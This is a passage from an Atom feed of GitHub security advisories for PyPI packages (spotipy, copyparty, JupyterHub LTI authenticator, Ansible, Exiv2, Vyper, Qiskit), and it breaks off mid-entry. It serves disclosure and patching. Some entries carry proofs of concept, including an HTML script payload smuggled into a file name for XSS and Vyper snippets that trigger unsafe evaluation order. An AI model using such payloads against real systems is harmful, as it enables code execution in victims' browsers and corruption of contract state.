<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-03-01T00:05:10.503Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[spotipy] Spotipy's cache file, containing spotify auth token, is created with overly broad permissions]]></title>
        <id>https://github.com/advisories/GHSA-pwhh-q4h6-w599</id>
        <link href="https://github.com/advisories/GHSA-pwhh-q4h6-w599"/>
        <updated>2025-02-28T02:34:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>CacheHandler</code> class creates a cache file to store the auth token here: <a href="https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98">https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98</a></p>
<p>The file created has <code>rw-r--r--</code> (644) permissions by default, when it could be locked down to <code>rw-------</code> (600) permissions. I think <code>600</code> is a sensible default.</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/0b7ebbc1-a27a-4528-ab6a-135c7886766a"></p>
<h3 id="details">Details</h3>
<p>This leads to overly broad exposure of the spotify auth token. If this token can be read by an attacker (another user on the machine, or a process running as another user), it can be used to perform administrative actions on the Spotify account, depending on the scope granted to the token.</p>
<h3 id="poc">PoC</h3>
<p>Run an application that uses spotipy with client creation like this:</p>
<pre><code class="language-python">from pathlib import Path
import spotipy
from os import getenv

def create_spotify_client(client_id: str, client_secret: str) -&gt; spotipy.Spotify:
    """Create and return an authenticated Spotify client.

    Args:
        client_id: Spotify API client ID
        client_secret: Spotify API client secret

    Returns:
        An authenticated Spotify client instance
    """
    cache_path = Path.home() / ".cache" / "spotify-backup/.auth_cache"
    cache_path.parent.mkdir(parents=True, exist_ok=True)
    cache_handler = spotipy.cache_handler.CacheFileHandler(cache_path=str(cache_path))

    client = spotipy.Spotify(
        auth_manager=spotipy.oauth2.SpotifyOAuth(
            client_id=client_id,
            client_secret=client_secret,
            redirect_uri="http://localhost:8000/callback",
            cache_handler=cache_handler,
            scope=[
                "user-library-read",
                "playlist-read-private",
                "playlist-read-collaborative",
            ],
        )
    )

    return client

create_spotify_client()
</code></pre>
<p>And then check the file permissions on the cache file that was created with:</p>
<pre><code class="language-bash">$ ls -la ~/.cache/spotify-backup/.auth_cache`
.rw-r--r--. alichtman alichtman 562 B Thu Feb 20 02:12:33 2025 ï€– /home/alichtman/.cache/spotify-backup/.auth_cache
</code></pre>
<p>If this issue is combined with another misconfiguration, like having <code>o+r</code> permissions set on your home directory, an attacker will be able to read this file and steal this auth token.</p>
<p>Good defense in depth would be to restrict read permissions on this cache file that contains an auth token</p>
<h3 id="impact">Impact</h3>
<p>Potential exposure of Spotify auth token to other users with access to the machine. A worst case scenario is if the token is granted all permissions, and can be used to do any of:</p>
<ul>
<li>exfiltrate spotify likes / saved playlists</li>
<li>delete your content</li>
<li>modify your content w/o your permission</li>
</ul>
<p>If someone were to discover an RCE in Spotify that you could trigger on a machine by having a song played (or song metadata parsed or something), this auth token could maybe be used to add a song to a playlist, or control playback (allowing further exploitation).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-pwhh-q4h6-w599">https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-pwhh-q4h6-w599</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27154">https://nvd.nist.gov/vuln/detail/CVE-2025-27154</a></li>
<li><a href="https://github.com/spotipy-dev/spotipy/commit/1ca453f6ef87a2a9e9876f52b6cb38d13532ccf2">https://github.com/spotipy-dev/spotipy/commit/1ca453f6ef87a2a9e9876f52b6cb38d13532ccf2</a></li>
<li><a href="https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98">https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98</a></li>
<li><a href="https://github.com/spotipy-dev/spotipy/releases/tag/2.25.1">https://github.com/spotipy-dev/spotipy/releases/tag/2.25.1</a></li>
<li><a href="https://github.com/advisories/GHSA-pwhh-q4h6-w599">https://github.com/advisories/GHSA-pwhh-q4h6-w599</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pwhh-q4h6-w599</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-28T02:34:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[copyparty] copyparty renders unsanitized filenames as HTML when user uploads empty files]]></title>
        <id>https://github.com/advisories/GHSA-m2jw-cj8v-937r</id>
        <link href="https://github.com/advisories/GHSA-m2jw-cj8v-937r"/>
        <updated>2025-02-26T20:06:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A <a href="https://capec.mitre.org/data/definitions/588.html">DOM-Based XSS</a> was discovered in <a href="https://github.com/9001/copyparty">copyparty</a>, a portable fileserver. The vulnerability is considered low-risk.</p>
<h2 id="details">Details</h2>
<p>By handing someone a maliciously-named file, and then tricking them into dragging the file into copyparty's Web-UI, an attacker could execute arbitrary javascript with the same privileges as that user. For example, this could give unintended read-access to files owned by that user. The bug is triggered by the drag-drop action itself; it is not necessary to actually initiate the upload. The file must be empty (zero bytes).</p>
<p>Note: As a general-purpose webserver, it is intentionally possible to upload HTML-files with arbitrary javascript in <code>&lt;script&gt;</code> tags, which will execute when the file is opened. The difference is that this vulnerability would trigger execution of javascript during the act of uploading, and not when the uploaded file was opened.</p>
<h2 id="proof-of-concept-poc">Proof of Concept (POC)</h2>
<ol>
<li>Create an empty file named <code>&lt;img src=x onerror="alert(1)"&gt;</code></li>
<li>Drag-and-drop the file into the browser to initiate an upload</li>
<li>The <code>alert(1)</code> is executed</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/9001/copyparty/security/advisories/GHSA-m2jw-cj8v-937r">https://github.com/9001/copyparty/security/advisories/GHSA-m2jw-cj8v-937r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27145">https://nvd.nist.gov/vuln/detail/CVE-2025-27145</a></li>
<li><a href="https://github.com/9001/copyparty/commit/438ea6ccb06f39d7cbb4b6ee7ad44606e21a63dd">https://github.com/9001/copyparty/commit/438ea6ccb06f39d7cbb4b6ee7ad44606e21a63dd</a></li>
<li><a href="https://github.com/9001/copyparty/releases/tag/v1.16.15">https://github.com/9001/copyparty/releases/tag/v1.16.15</a></li>
<li><a href="https://github.com/advisories/GHSA-m2jw-cj8v-937r">https://github.com/advisories/GHSA-m2jw-cj8v-937r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m2jw-cj8v-937r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-26T20:06:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterhub-ltiauthenticator] LTI JupyterHub Authenticator does not properly validate JWT Signature]]></title>
        <id>https://github.com/advisories/GHSA-mcgx-2gcr-p3hp</id>
        <link href="https://github.com/advisories/GHSA-mcgx-2gcr-p3hp"/>
        <updated>2025-02-25T17:48:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Only users that has configured a JupyterHub installation to use the authenticator class <code>LTI13Authenticator</code> are influenced.</p>
<p>LTI13Authenticator that was introduced in <code>jupyterhub-ltiauthenticator</code> 1.3.0 wasn't validating JWT signatures. This is believed to allow the LTI13Authenticator to authorize a forged request granting access to existing and new user identities.</p>
<h3 id="patches">Patches</h3>
<p>None.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164">This code segment</a> didn't validate a JWT signature.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-mcgx-2gcr-p3hp">https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-mcgx-2gcr-p3hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25574">https://nvd.nist.gov/vuln/detail/CVE-2023-25574</a></li>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164">https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164</a></li>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/blob/main/CHANGELOG.md#140---2023-03-01">https://github.com/jupyterhub/ltiauthenticator/blob/main/CHANGELOG.md#140---2023-03-01</a></li>
<li><a href="https://github.com/advisories/GHSA-mcgx-2gcr-p3hp">https://github.com/advisories/GHSA-mcgx-2gcr-p3hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mcgx-2gcr-p3hp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-25T17:48:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File]]></title>
        <id>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</id>
        <link href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"/>
        <updated>2025-02-24T15:15:39.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8775">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-8775">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2312119">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:8969">https://access.redhat.com/errata/RHSA-2024:8969</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:9894">https://access.redhat.com/errata/RHSA-2024:9894</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:10762">https://access.redhat.com/errata/RHSA-2024:10762</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:1249">https://access.redhat.com/errata/RHSA-2025:1249</a></li>
<li><a href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>
<li><a href="https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>
<li><a href="https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>
<li><a href="https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-16T14:37:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File]]></title>
        <id>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</id>
        <link href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"/>
        <updated>2025-02-24T15:15:39.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8775">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-8775">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2312119">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:8969">https://access.redhat.com/errata/RHSA-2024:8969</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:9894">https://access.redhat.com/errata/RHSA-2024:9894</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:10762">https://access.redhat.com/errata/RHSA-2024:10762</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:1249">https://access.redhat.com/errata/RHSA-2025:1249</a></li>
<li><a href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>
<li><a href="https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>
<li><a href="https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>
<li><a href="https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-16T14:37:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Exiv2] Exiv2 allows Use After Free]]></title>
        <id>https://github.com/advisories/GHSA-38h4-fx85-qcx7</id>
        <link href="https://github.com/advisories/GHSA-38h4-fx85-qcx7"/>
        <updated>2025-02-21T23:53:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A heap buffer overflow was found in Exiv2 versions v0.28.0 to v0.28.4. Versions prior to v0.28.0, such as v0.27.7, are <strong>not</strong> affected. Exiv2 is a command-line utility and C++ library for reading, writing, deleting, and modifying the metadata of image files. The heap overflow is triggered when Exiv2 is used to write metadata into a crafted image file. An attacker could potentially exploit the vulnerability to gain code execution, if they can trick the victim into running Exiv2 on a crafted image file.</p>
<p>Note that this bug is only triggered when writing the metadata, which is a less frequently used Exiv2 operation than reading the metadata. For example, to trigger the bug in the Exiv2 command-line application, you need to add an extra command-line argument such as <code>fixiso</code>.</p>
<h3 id="patches">Patches</h3>
<p>The bug is fixed in version v0.28.5.</p>
<h3 id="references">References</h3>
<p>Issue: <a href="https://github.com/Exiv2/exiv2/issues/3168">https://github.com/Exiv2/exiv2/issues/3168</a>
Fix: <a href="https://github.com/Exiv2/exiv2/pull/3174">https://github.com/Exiv2/exiv2/pull/3174</a></p>
<h3 id="for-more-information">For more information</h3>
<p>Please see our <a href="https://github.com/Exiv2/exiv2/security/policy">security policy</a> for information about Exiv2 security.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7">https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26623">https://nvd.nist.gov/vuln/detail/CVE-2025-26623</a></li>
<li><a href="https://github.com/Exiv2/exiv2/issues/3168">https://github.com/Exiv2/exiv2/issues/3168</a></li>
<li><a href="https://github.com/Exiv2/exiv2/pull/3174">https://github.com/Exiv2/exiv2/pull/3174</a></li>
<li><a href="https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4">https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4</a></li>
<li><a href="https://github.com/advisories/GHSA-38h4-fx85-qcx7">https://github.com/advisories/GHSA-38h4-fx85-qcx7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38h4-fx85-qcx7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-21T23:53:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper has a double eval in For List Iter]]></title>
        <id>https://github.com/advisories/GHSA-h33q-mhmp-8p67</id>
        <link href="https://github.com/advisories/GHSA-h33q-mhmp-8p67"/>
        <updated>2025-02-24T20:26:23.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple evaluation of a single expression is possible in the iterator target of a for loop. While the iterator expression cannot produce multiple writes, it can consume side effects produced in the loop body (e.g. read a storage variable updated in the loop body) and thus lead to unexpected program behavior. Specifically, reads in iterators which contain an ifexp (e.g. <code>for s: uint256 in ([read(), read()] if True else [])</code>) may interleave reads with writes in the loop body.</p>
<p>The fix is tracked in <a href="https://github.com/vyperlang/vyper/pull/4488">https://github.com/vyperlang/vyper/pull/4488</a>.</p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>Vyper for loops allow two kinds of iterator targets, namely the <code>range()</code> builtin and an iterable type, like SArray and DArray. </p>
<p>During codegen, iterable lists are required to not produce any side-effects (in the following code, <code>range_scope</code> forces <code>iter_list</code> to be parsed in a constant context, which is checked against <code>is_constant</code>).</p>
<pre><code class="language-python">def _parse_For_list(self):
    with self.context.range_scope():
        iter_list = Expr(self.stmt.iter, self.context).ir_node
    ...

def range_scope(self):
    prev_value = self.in_range_expr
    self.in_range_expr = True
    yield
    self.in_range_expr = prev_value

def is_constant(self):
    return self.constancy is Constancy.Constant or self.in_range_expr
</code></pre>
<p>However, this does not prevent the iterator from consuming side effects provided by the body of the loop. For dynamic arrays, the compiler simply panics:</p>
<pre><code class="language-vyper">x: DynArray[uint256, 3]

@external
def test():
    for i: uint256 in (self.usesideeffect() if True else self.usesideeffect()):
        pass

@view
def usesideeffect() -&gt; DynArray[uint256, 3]:
    return self.x
</code></pre>
<p>For SArrays on the other hand, <code>iter_list</code> is instantiated in the body of a <code>repeat</code> ir, so it can be evaluated several times.</p>
<p>Here are three illustrating examples. In the first example, the following test case pre-evaluates the iter list and stores the result to a temporary list in memory. So the list is only evaluated once, before entry into the loop body, and the log output will be 0, 0, 0.</p>
<pre><code class="language-vyper">event I:
    i: uint256

x: uint256

@deploy
def __init__():
    self.x = 0

@external
def test():
    for i: uint256 in [self.usesideeffect(), self.usesideeffect(), self.usesideeffect()]:
        self.x += 1
        log I(i)

@view
def usesideeffect() -&gt; uint256:
    return self.x
</code></pre>
<p>However, in the next two examples, because the iterator target is not a list literal, it will be evaluated in the loop body. In the second example, <code>iter_list</code> is an ifexp, thus it will be evaluated lazily in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>
<pre><code class="language-vyper">event I:
    i: uint256

x: uint256

@deploy
def __init__():
    self.x = 0

@external
def test():
    for i: uint256 in ([self.usesideeffect(), self.usesideeffect(), self.usesideeffect()] if True else self.otherclause()):
        self.x += 1
        log I(i)

@view
def usesideeffect() -&gt; uint256:
    return self.x

@view
def otherclause() -&gt; uint256[3]:
    return [0, 0, 0]
</code></pre>
<p>In the third example, <code>iter_list</code> is also an ifexp, thus it will only be evaluated in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>
<pre><code class="language-vyper">event I:
    i: uint256

x: uint256[3]

@deploy
def __init__():
    self.x = [0, 0, 0]

@external
def test():
    for i: uint256 in (self.usesideeffect() if True else self.otherclause()):
        self.x[0] += 1
        self.x[1] += 1
        self.x[2] += 1
        log I(i)

@view
def usesideeffect() -&gt; uint256[3]:
    return self.x

@view
def otherclause() -&gt; uint256[3]:
    return [0, 0, 0]
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67">https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67</a></li>
<li><a href="https://github.com/vyperlang/vyper/pull/4488">https://github.com/vyperlang/vyper/pull/4488</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27104">https://nvd.nist.gov/vuln/detail/CVE-2025-27104</a></li>
<li><a href="https://github.com/advisories/GHSA-h33q-mhmp-8p67">https://github.com/advisories/GHSA-h33q-mhmp-8p67</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h33q-mhmp-8p67</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-21T22:43:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] AugAssign evaluation order causing OOB write within the object in Vyper]]></title>
        <id>https://github.com/advisories/GHSA-4w26-8p97-f4jp</id>
        <link href="https://github.com/advisories/GHSA-4w26-8p97-f4jp"/>
        <updated>2025-02-24T20:25:11.000Z</updated>
        <content type="html"><![CDATA[<p>Vyper handles AugAssign statements by first caching the target location to avoid double evaluation. However, in the case when target is an access to a DynArray and the rhs modifies the array, the cached target will evaluate first, and the bounds check will not be re-evaluated during the write portion of the statement. In other words, the following code</p>
<pre><code class="language-vyper">def poc():
    a: DynArray[uint256, 2] = [1, 2]
    a[1] += a.pop()
</code></pre>
<p>is equivalent to:</p>
<pre><code class="language-vyper">def poc():
    a: DynArray[uint256, 2] = [1, 2]
    a[1] += a[len(a) - 1]
    a.pop()
</code></pre>
<p>rather than:</p>
<pre><code class="language-vyper">def poc():
    a: DynArray[uint256, 2] = [1, 2]
    s: uint256 = a[1]
    t: uint256 = a.pop()
    a[1] = s + t  # reverts due to oob access
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-4w26-8p97-f4jp">https://github.com/vyperlang/vyper/security/advisories/GHSA-4w26-8p97-f4jp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27105">https://nvd.nist.gov/vuln/detail/CVE-2025-27105</a></li>
<li><a href="https://github.com/advisories/GHSA-4w26-8p97-f4jp">https://github.com/advisories/GHSA-4w26-8p97-f4jp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4w26-8p97-f4jp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-21T22:43:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper's sqrt doesn't define rounding behavior]]></title>
        <id>https://github.com/advisories/GHSA-2p94-8669-xg86</id>
        <link href="https://github.com/advisories/GHSA-2p94-8669-xg86"/>
        <updated>2025-02-24T20:23:52.000Z</updated>
        <content type="html"><![CDATA[<p>Vyper's <code>sqrt()</code> builtin uses the babylonian method to calculate square roots of decimals. Unfortunately, improper handling of the oscillating final states may lead to sqrt incorrectly returning rounded up results.</p>
<p>the fix is tracked in <a href="https://github.com/vyperlang/vyper/pull/4486">https://github.com/vyperlang/vyper/pull/4486</a></p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>Vyper injects the following code to handle calculation of decimal sqrt. x is the input provided by user.</p>
<pre><code class="language-python">assert x &gt;= 0.0
z: decimal = 0.0

if x == 0.0:
    z = 0.0
else:
    z = x / 2.0 + 0.5
    y: decimal = x

    for i: uint256 in range(256):
        if z == y:
            break
        y = z
        z = (x / z + z) / 2.0
</code></pre>
<p>Notably, the terminal condition of the algorithm is either <code>z_cur == z_prev</code>, or the algorithm runs for 256 rounds.</p>
<p>However, for certain inputs, <code>z</code> might actually oscillate between <code>N</code> and <code>N + epsilon</code>, where <code>N ** 2 &lt;= x &lt; (N + epsilon) ** 2</code>. This means that the current behavior does not define whether it will round up or down to the nearest epsilon.</p>
<p>The example snippet here returns 0.9999999999, the rounded up result for sqrt(0.9999999998). This is due to the oscillation ending in N + epsilon instead of N.</p>
<pre><code class="language-vyper">@external
def test():
    d: decimal = 0.9999999998
    r: decimal = sqrt(d)    #this will be 0.9999999999
</code></pre>
<p>Note that <code>sqrt()</code> diverges from <code>isqrt()</code> here -- <code>isqrt()</code> consistently rounds down, so it is not subject to the same issue.</p>
<h3 id="impact-details">Impact Details</h3>
<p>Since <code>sqrt()</code> can be used for determining boundary conditions, rounding down is preferred. However, since <code>sqrt()</code> is used very rarely in the wild, this advisory has been assigned an impact of <code>low</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-2p94-8669-xg86">https://github.com/vyperlang/vyper/security/advisories/GHSA-2p94-8669-xg86</a></li>
<li><a href="https://github.com/vyperlang/vyper/pull/4486">https://github.com/vyperlang/vyper/pull/4486</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26622">https://nvd.nist.gov/vuln/detail/CVE-2025-26622</a></li>
<li><a href="https://github.com/advisories/GHSA-2p94-8669-xg86">https://github.com/advisories/GHSA-2p94-8669-xg86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2p94-8669-xg86</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-21T22:43:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qiskit-terra] Malciously crafted QPY files can allows Remote Attackers to Cause Denial of Service in Qiskit]]></title>
        <id>https://github.com/advisories/GHSA-fpmr-m242-xm7x</id>
        <link href="https://github.com/advisories/GHSA-fpmr-m242-xm7x"/>
        <updated>2025-02-21T21:42:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A maliciously crafted QPY file containing a malformed <code>symengine</code> serialization stream as part of the larger QPY serialization of a <code>ParameterExpression</code> object can cause a segfault within the <code>symengine</code> library, allowing an attacker to terminate the hosting process deserializing the QPY payload.</p>
<h3 id="patches">Patches</h3>
<p>This issue is addressed in 1.3.0 when using QPY format version 13. QPY format versions 10, 11, and 12 are all still inherently vulnerable if they are using symengine symbolic encoding and <code>symengine &lt;= 0.13.0</code> is installed in the deserializing environment (as of publishing there is no newer compatible release of symengine available). Using QPY 13 is strongly recommended for this reason.</p>
<p>The symengine 0.14.0 release has addressed the segfault issue, but it is backward incompatible and will not work with any Qiskit release; it also prevents loading a payload generated with any other version of symengine. Using QPY 13 is strongly recommended for this reason.</p>
<p>It is also strongly suggested to patch the locally installed version of symengine in the deserializing environment to prevent the specific segfault. The commit [1] can be applied on top of symengine 0.13.0 and used to build a patched python library that will not segfault in the presence of a malformed payload and instead raise a <code>RuntimeError</code> which will address the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As QPY is backwards compatible <code>qiskit.qpy.load()</code> function will always attempt to deserialize the <code>symengine</code>-serialized payloads in QPY format versions 10, 11, and 12. These are any payloads generated with the <code>use_symengine</code> argument on <code>qiskit.qpy.dump()</code> set to <code>True</code> (which is the default value starting in Qiskit 1.0.0. The only option is to disallow parsing if those QPY formats are being read and the <code>use_symengine</code> flag was set in the file's header. You can detect whether a payload is potentially vulnerable by using the following function built using the Python standard library:</p>
<pre><code class="language-python">import struct
from collections import namedtuple


def check_qpy_payload(path: str) -&gt; bool:
    """Function to check if a QPY payload is potentially vulnerable to a symengine vulnerability.

    Args:
        path: The path to the QPY file

    Returns:
        Whether the specified payload is potentially vulnerable. If ``True`` the conditions for
        being vulnerable exist, however the payload may not be vulnerable it can't be detected
        until trying to deserialize.
    """
    with open(path, "rb") as file_obj:
        version = struct.unpack("!6sB", file_obj.read(7))[1]
        if version &lt; 10 or version &gt;= 13:
            return False
        file_obj.seek(0)
        header_tuple = namedtuple(
            "FILE_HEADER",
            [
                "preface",
                "qpy_version",
                "major_version",
                "minor_version",
                "patch_version",
                "num_programs",
                "symbolic_encoding",
            ],
        )
        header_pack_str = "!6sBBBBQc"
        header_read_size = struct.calcsize(header_pack_str)
        data = struct.unpack(header_pack_str, file_obj.read(header_read_size))
        header = header_tuple(*data)
        return header.symbolic_encoding == b"e"
</code></pre>
<p>Note, this function does <strong>not</strong> tell you whether the payload is malicious and will cause the segfault, just that conditions for it to be potentially malicious exist. It's not possible to know ahead of time whether <code>symengine</code> will segfault until the data is passed to that library.</p>
<h3 id="references">References</h3>
